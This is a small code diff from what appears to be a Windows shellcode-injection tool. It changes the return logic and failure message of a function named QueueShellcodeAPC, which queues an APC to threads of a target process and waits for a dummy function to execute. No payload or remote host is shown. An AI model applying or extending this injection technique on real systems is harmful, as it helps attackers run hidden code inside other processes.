@@ -693,9 +693,6 @@ BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {
 		}
 	} while (Thread32Next(hSnapshot, &te32));
 	int x = 0;
-	if (i == 0) {
-		return FALSE;
-	}
 	do {
 		Sleep(100);
 		if (executed) {
@@ -703,17 +700,14 @@ BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {
 			CloseHandle(hSnapshot);
 			return TRUE;
 		}
-		else if (x == 9) {
-			printf("[-] DummyAPCFunc was not executed.\n");
-			return FALSE;
-		}
 		else {
 			x++;
 		}
 	} while (x < 10);
-
+	printf("[-] DummyAPCFunc was not executed.\n");
+	fflush(stdout);
 	CloseHandle(hSnapshot);
-	return TRUE;
+	return FALSE;
 }
 
 void MySleepEx() {
